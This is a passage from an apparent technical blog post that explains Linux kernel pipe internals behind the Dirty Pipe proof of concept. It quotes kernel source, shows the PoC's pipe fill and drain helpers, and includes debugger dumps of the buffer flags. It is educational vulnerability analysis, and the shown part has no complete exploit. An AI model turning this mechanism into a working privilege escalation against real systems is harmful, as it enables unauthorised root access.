.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>create_pipe_files</span><span class=p>(</span><span class=k>struct</span> <span class=n>file</span> <span class=o>**</span><span class=n>res</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>inode</span> <span class=o>*</span><span class=n>inode</span> <span class=o>=</span> <span class=nf>get_pipe_inode</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>file</span> <span class=o>*</span><span class=n>f</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>error</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=nf>alloc_file_pseudo</span><span class=p>(</span><span class=n>inode</span><span class=p>,</span> <span class=n>pipe_mnt</span><span class=p>,</span> <span class=s>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>O_WRONLY</span> <span class=o>|</span> <span class=p>(</span><span class=n>flags</span> <span class=o>&amp;</span> <span class=p>(</span><span class=n>O_NONBLOCK</span> <span class=o>|</span> <span class=n>O_DIRECT</span><span class=p>)),</span>
</span></span><span class=line><span class=cl>                <span class=o>&amp;</span><span class=n>pipefifo_fops</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>-&gt;</span><span class=n>private_data</span> <span class=o>=</span> <span class=n>inode</span><span class=o>-&gt;</span><span class=n>i_pipe</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>res</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nf>alloc_file_clone</span><span class=p>(</span><span class=n>f</span><span class=p>,</span> <span class=n>O_RDONLY</span> <span class=o>|</span> <span class=p>(</span><span class=n>flags</span> <span class=o>&amp;</span> <span class=n>O_NONBLOCK</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                  <span class=o>&amp;</span><span class=n>pipefifo_fops</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>-&gt;</span><span class=n>private_data</span> <span class=o>=</span> <span class=n>inode</span><span class=o>-&gt;</span><span class=n>i_pipe</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>f</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>stream_open</span><span class=p>(</span><span class=n>inode</span><span class=p>,</span> <span class=n>res</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>stream_open</span><span class=p>(</span><span class=n>inode</span><span class=p>,</span> <span class=n>res</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L911 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>The initialization of the common inode structure happens in <code>get_pipe_inode()</code>. We can see that an inode is created and also information for the pipe is allocated and stored such that <code>inode->i_pipe</code> can later be used to access the pipe from a given inode. Furthermore, <code>inode->i_fops</code> specifies the implementations used for file operations on a pipe.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=k>struct</span> <span class=n>inode</span> <span class=o>*</span><span class=nf>get_pipe_inode</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>inode</span> <span class=o>*</span><span class=n>inode</span> <span class=o>=</span> <span class=nf>new_inode_pseudo</span><span class=p>(</span><span class=n>pipe_mnt</span><span class=o>-&gt;</span><span class=n>mnt_sb</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>pipe_inode_info</span> <span class=o>*</span><span class=n>pipe</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=n>inode</span><span class=o>-&gt;</span><span class=n>i_ino</span> <span class=o>=</span> <span class=nf>get_next_ino</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pipe</span> <span class=o>=</span> <span class=nf>alloc_pipe_info</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=n>inode</span><span class=o>-&gt;</span><span class=n>i_pipe</span> <span class=o>=</span> <span class=n>pipe</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>files</span> <span class=o>=</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>readers</span> <span class=o>=</span> <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>writers</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>inode</span><span class=o>-&gt;</span><span class=n>i_fop</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>pipefifo_fops</span><span class=p>;</span> <span class=c1>// lolcads: see description below
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>     * Mark the inode dirty from the very beginning,
</span></span></span><span class=line><span class=cl><span class=cm>     * that way it will never be moved to the dirty
</span></span></span><span class=line><span class=cl><span class=cm>     * list because &#34;mark_inode_dirty()&#34; will think
</span></span></span><span class=line><span class=cl><span class=cm>     * that it already _is_ on the dirty list.
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>    <span class=n>inode</span><span class=o>-&gt;</span><span class=n>i_state</span> <span class=o>=</span> <span class=n>I_DIRTY</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>inode</span><span class=o>-&gt;</span><span class=n>i_mode</span> <span class=o>=</span> <span class=n>S_IFIFO</span> <span class=o>|</span> <span class=n>S_IRUSR</span> <span class=o>|</span> <span class=n>S_IWUSR</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>inode</span><span class=o>-&gt;</span><span class=n>i_uid</span> <span class=o>=</span> <span class=nf>current_fsuid</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>inode</span><span class=o>-&gt;</span><span class=n>i_gid</span> <span class=o>=</span> <span class=nf>current_fsgid</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>inode</span><span class=o>-&gt;</span><span class=n>i_atime</span> <span class=o>=</span> <span class=n>inode</span><span class=o>-&gt;</span><span class=n>i_mtime</span> <span class=o>=</span> <span class=n>inode</span><span class=o>-&gt;</span><span class=n>i_ctime</span> <span class=o>=</span> <span class=nf>current_time</span><span class=p>(</span><span class=n>inode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>inode</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L871 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>Most of the pipe-specific setup happens is <code>alloc_pipe_info()</code>. Here you can see the actual creation of the pipe, not just the inode, but the <code>pipe_buffer</code>s / <code>pipe_inode_info->bufs</code> that hold the content / data of the pipe.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>pipe_inode_info</span> <span class=o>*</span><span class=nf>alloc_pipe_info</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>pipe_inode_info</span> <span class=o>*</span><span class=n>pipe</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>pipe_bufs</span> <span class=o>=</span> <span class=n>PIPE_DEF_BUFFERS</span><span class=p>;</span> <span class=c1>// lolcads: defaults to 16
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>struct</span> <span class=n>user_struct</span> <span class=o>*</span><span class=n>user</span> <span class=o>=</span> <span class=nf>get_current_user</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>user_bufs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>max_size</span> <span class=o>=</span> <span class=nf>READ_ONCE</span><span class=p>(</span><span class=n>pipe_max_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=c1>// lolcads: allocate the inode info
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>pipe</span> <span class=o>=</span> <span class=nf>kzalloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>pipe_inode_info</span><span class=p>),</span> <span class=n>GFP_KERNEL_ACCOUNT</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=c1>// lolcads: allocate the buffers with the page references
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>bufs</span> <span class=o>=</span> <span class=nf>kcalloc</span><span class=p>(</span><span class=n>pipe_bufs</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>pipe_buffer</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                 <span class=n>GFP_KERNEL_ACCOUNT</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>pipe</span><span class=o>-&gt;</span><span class=n>bufs</span><span class=p>)</span> <span class=p>{</span> <span class=c1>// lolcads: set up the rest of the relevant fields
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>init_waitqueue_head</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pipe</span><span class=o>-&gt;</span><span class=n>rd_wait</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>init_waitqueue_head</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pipe</span><span class=o>-&gt;</span><span class=n>wr_wait</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>r_counter</span> <span class=o>=</span> <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>w_counter</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>max_usage</span> <span class=o>=</span> <span class=n>pipe_bufs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>ring_size</span> <span class=o>=</span> <span class=n>pipe_bufs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>nr_accounted</span> <span class=o>=</span> <span class=n>pipe_bufs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>user</span> <span class=o>=</span> <span class=n>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>mutex_init</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pipe</span><span class=o>-&gt;</span><span class=n>mutex</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>pipe</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L782 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><h3 id=debugger>Debugger</h3><p>We can print a summary of the freshly initialized pipe (after resizing it) by breaking at the end of <code>pipe_fcntl()</code>, which is the handler invoked in the <code>case F_SETPIPE_SZ:</code> of the switch statement inside <a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1392 target=_blank rel=noopener><code>do_fcntl()</code></a>
.</p><pre tabindex=0><code>struct pipe_inode_info at 0xffff8881044aec00
&gt; &#39;head&#39;: 0
&gt; &#39;tail&#39;: 0
&gt; &#39;ring_size&#39;: 1
&gt; &#39;bufs&#39;: 0xffff888101f8a180

struct pipe_buffer at 0xffff888101f8a180
&gt; &#39;page&#39;: NULL
&gt; &#39;offset&#39;: 0
&gt; &#39;len&#39;: 0
&gt; &#39;ops&#39;: NULL
&gt; &#39;flags&#39;:
</code></pre><p>There&rsquo;s not much to see yet, but we keep this as a reference to see how things evolve over time.</p><h2 id=pipes-readingwriting>Pipes (reading/writing)</h2><h3 id=writing>Writing</h3><p>After allocating the pipe, the PoC proceeds by writing to it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>fill_pipe</span><span class=p>(</span><span class=kt>int</span> <span class=n>pipefd_w</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=n>PAGESIZE</span> <span class=o>/</span> <span class=mi>8</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>pause_for_inspection</span><span class=p>(</span><span class=s>&#34;About to perform first write() to pipe&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>==</span> <span class=n>PAGESIZE</span> <span class=o>/</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>pause_for_inspection</span><span class=p>(</span><span class=s>&#34;About to perform last write() to pipe&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>write</span><span class=p>(</span><span class=n>pipefd_w</span><span class=p>,</span> <span class=s>&#34;AAAAAAAA&#34;</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L18 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>By looking at the file operations of a pipe inode we can see that <code>write</code>s to a pipe are handled by <code>pipe_write()</code>. When data is moved across the kernel-user-space boundary (or within the kernel) one frequently encounters vectorized I/O using <a href=https://lwn.net/Articles/625077/ target=_blank rel=noopener><code>iov_iter</code></a>
objects. For our purposes we can think of them as buffers but feel free to follow the links to learn more (also <a href=https://en.wikipedia.org/wiki/Vectored_I/O target=_blank rel=noopener>this</a>
).</p><pre tabindex=0><code class="language-c=" data-lang="c=">static ssize_t
pipe_write(struct kiocb *iocb, struct iov_iter *from)
{
    struct file *filp = iocb-&gt;ki_filp;
    struct pipe_inode_info *pipe = filp-&gt;private_data;
    unsigned int head;
    ssize_t ret = 0;
    size_t total_len = iov_iter_count(from);
    ssize_t chars;
    bool was_empty = false;
...
    /*
     * If it wasn&#39;t empty we try to merge new data into
     * the last buffer.
     *
     * That naturally merges small writes, but it also
     * page-aligns the rest of the writes for large writes
     * spanning multiple pages.
     */
    head = pipe-&gt;head;
    was_empty = pipe_empty(head, pipe-&gt;tail);
    chars = total_len &amp; (PAGE_SIZE-1);
    if (chars &amp;&amp; !was_empty) {
        unsigned int mask = pipe-&gt;ring_size - 1;
        struct pipe_buffer *buf = &amp;pipe-&gt;bufs[(head - 1) &amp; mask];
        int offset = buf-&gt;offset + buf-&gt;len;

        if ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;
            offset + chars &lt;= PAGE_SIZE) {
...
            ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);
...
            buf-&gt;len += ret;
            if (!iov_iter_count(from))
                goto out;
        }
    }

    for (;;) {
...
        head = pipe-&gt;head;
        if (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) {
            unsigned int mask = pipe-&gt;ring_size - 1;
            struct pipe_buffer *buf = &amp;pipe-&gt;bufs[head &amp; mask];
            struct page *page = pipe-&gt;tmp_page;
            int copied;

            if (!page) {
                page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
...
                pipe-&gt;tmp_page = page;
            }

            /* Allocate a slot in the ring in advance and attach an
             * empty buffer.  If we fault or otherwise fail to use
             * it, either the reader will consume it or it&#39;ll still
             * be there for the next write.
             */
            spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);

            head = pipe-&gt;head;
            if (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) {
                spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);
                continue;
            }

            pipe-&gt;head = head + 1;
            spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);

            /* Insert it into the buffer array */
            buf = &amp;pipe-&gt;bufs[head &amp; mask];
            buf-&gt;page = page;
            buf-&gt;ops = &amp;anon_pipe_buf_ops;
            buf-&gt;offset = 0;
            buf-&gt;len = 0;
            if (is_packetized(filp))
                buf-&gt;flags = PIPE_BUF_FLAG_PACKET;
            else
                buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;
            pipe-&gt;tmp_page = NULL;

            copied = copy_page_from_iter(page, 0, PAGE_SIZE, from);
...
            ret += copied;
            buf-&gt;offset = 0;
            buf-&gt;len = copied;

            if (!iov_iter_count(from))
                break;
        }

        if (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))
            continue;
...
    }
out:
...
    return ret;
}
</code></pre><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L416 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>When handling a <code>write()</code> to a pipe, the kernel differentiates between two cases. First it checks if it can append (at least a part of) the data to <code>page</code> of the <code>pipe_buffer</code> that is currently the <code>head</code> of the ring. Whether or not this is possible is decided by three things:</p><ul><li>is the pipe non-empty when we start writing? (implies that there are initialized buffers available)<code>!was_empty</code></li><li>is the <code>PIPE_BUF_FLAG_CAN_MERGE</code> flag set?<code>buf->flags & PIPE_BUF_FLAG_CAN_MERGE</code></li><li>is there is enough space left on the page?<code>offset + chars &lt;= PAGE_SIZE</code></li></ul><p>If the answer to all of those questions is <em>yes</em> the kernel starts the write by appending to the existing page.</p><p>To complete the rest of the write the kernel advances the <code>head</code> to the next <code>pipe_buffer</code>, allocates a fresh <code>page</code> for it, initializes the flags (the<code>PIPE_BUF_FLAG_CAN_MERGE</code> flag will be set, unless the user explicitly asked for the pipe to be in <code>O_DIRECT</code> mode), and writes the data to the beginning of the new page. This continues until there is no data left to write (or the pipe is full). Regarding the <code>O_DIRECT</code> mode of <code>pipe()</code>:</p><pre tabindex=0><code>[...]
O_DIRECT (since Linux 3.4)
              Create a pipe that performs I/O in &#34;packet&#34; mode.  Each
              write(2) to the pipe is dealt with as a separate packet,
              and read(2)s from the pipe will read one packet at a time.
[...]
</code></pre><p><a href=https://www.man7.org/linux/man-pages/man2/pipe.2.html target=_blank rel=noopener>source</a></p><p>This is handled in the <code>if</code>-condition <code>is_packetized(filp)</code> in <code>pipe_write()</code> (see above).</p><p>We can also see these two types of writes in the debugger. The first write is into an empty pipe and thus initializes our previously zero-filled pipe buffer.</p><pre tabindex=0><code>struct pipe_buffer at 0xffff888101f8a180
&gt; &#39;page&#39;: 0xffffea00040e3bc0
&gt; &#39;offset&#39;: 0
&gt; &#39;len&#39;: 8
&gt; &#39;ops&#39;: 0xffffffff8221bb00 &lt;anon_pipe_buf_ops&gt;
&gt; &#39;flags&#39;: PIPE_BUF_FLAG_CAN_MERGE

struct page at 0xffffea00040e3bc0
&gt; virtual: 0xffff8881038ef000
&gt; data: b&#39;AAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;[...]b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;
</code></pre><p>All subsequent writes go down the &ldquo;append path&rdquo; and fill the existing page.</p><pre tabindex=0><code>struct pipe_buffer at 0xffff888101f8a180
&gt; &#39;page&#39;: 0xffffea00040e3bc0
&gt; &#39;offset&#39;: 0
&gt; &#39;len&#39;: 4096
&gt; &#39;ops&#39;: 0xffffffff8221bb00 &lt;anon_pipe_buf_ops&gt;
&gt; &#39;flags&#39;: PIPE_BUF_FLAG_CAN_MERGE

struct page at 0xffffea00040e3bc0
&gt; virtual: 0xffff8881038ef000
&gt; data: b&#39;AAAAAAAAAAAAAAAAAAAA&#39;[...]b&#39;AAAAAAAAAAAAAAAAAAAA&#39;
</code></pre><h3 id=reading>Reading</h3><p>Next, the POC drains the pipe by consuming / <code>read</code>ing all the <code>A</code>s from the reading end.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>drain_pipe</span><span class=p>(</span><span class=kt>int</span> <span class=n>pipefd_r</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=n>PAGESIZE</span> <span class=o>/</span> <span class=mi>8</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>==</span> <span class=n>PAGESIZE</span> <span class=o>/</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>pause_for_inspection</span><span class=p>(</span><span class=s>&#34;About to perform last read() from pipe&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>read</span><span class=p>(</span><span class=n>pipefd_r</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L34 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>The case where a process asks the kernel to <code>read()</code> from a pipe is handled by the function <code>pipe_read()</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>ssize_t</span>
</span></span><span class=line><span class=cl><span class=nf>pipe_read</span><span class=p>(</span><span class=k>struct</span> <span class=n>kiocb</span> <span class=o>*</span><span class=n>iocb</span><span class=p>,</span> <span class=k>struct</span> <span class=n>iov_iter</span> <span class=o>*</span><span class=n>to</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>total_len</span> <span class=o>=</span> <span class=nf>iov_iter_count</span><span class=p>(</span><span class=n>to</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>file</span> <span class=o>*</span><span class=n>filp</span> <span class=o>=</span> <span class=n>iocb</span><span class=o>-&gt;</span><span class=n>ki_filp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>pipe_inode_info</span> <span class=o>*</span><span class=n>pipe</span> <span class=o>=</span> <span class=n>filp</span><span class=o>-&gt;</span><span class=n>private_data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>bool</span> <span class=n>was_full</span><span class=p>,</span> <span class=n>wake_next_reader</span> <span class=o>=</span> <span class=nb>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>ssize_t</span> <span class=n>ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=n>ret</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>__pipe_lock</span><span class=p>(</span><span class=n>pipe</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>     * We only wake up writers if the pipe was full when we started
</span></span></span><span class=line><span class=cl><span class=cm>     * reading in order to avoid unnecessary wakeups.
</span></span></span><span class=line><span class=cl><span class=cm>     *
</span></span></span><span class=line><span class=cl><span class=cm>     * But when we do wake up writers, we do so using a sync wakeup
</span></span></span><span class=line><span class=cl><span class=cm>     * (WF_SYNC), because we want them to get going and generate more
</span></span></span><span class=line><span class=cl><span class=cm>     * data for us.
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>    <span class=n>was_full</span> <span class=o>=</span> <span class=nf>pipe_full</span><span class=p>(</span><span class=n>pipe</span><span class=o>-&gt;</span><span class=n>head</span><span class=p>,</span> <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>tail</span><span class=p>,</span> <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>max_usage</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(;;)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=cm>/* Read -&gt;head with a barrier vs post_one_notification() */</span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>head</span> <span class=o>=</span> <span class=nf>smp_load_acquire</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pipe</span><span class=o>-&gt;</span><span class=n>head</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>tail</span> <span class=o>=</span> <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>tail</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>mask</span> <span class=o>=</span> <span class=n>pipe</span><span class=o>-&gt;</span><span class=n>ring_size</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>pipe_empty</span><span class=p>(</span><span class=n>head</span><span class=p>,</span> <span class=n>tail</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>struct</span> <span class=n>pipe_buffer</span> <span class=o>*</span><span class=n>buf</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>pipe</span><span class=o>-&gt;</span><span class=n>bufs</span><span class=p>[</span><span class=n>tail</span> <span class=o>&amp;</span> <span class=n>mask</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=kt>size_t</span> <span class=n>chars</span> <span class=o>=</span> <span class=n>buf</span><span class=o>-&gt;</span><span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kt>size_t</span> <span class=n>written</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kt>int</span> <span class=n>error</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>chars</span> <span class=o>&gt;</span> <span class=n>total_len</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
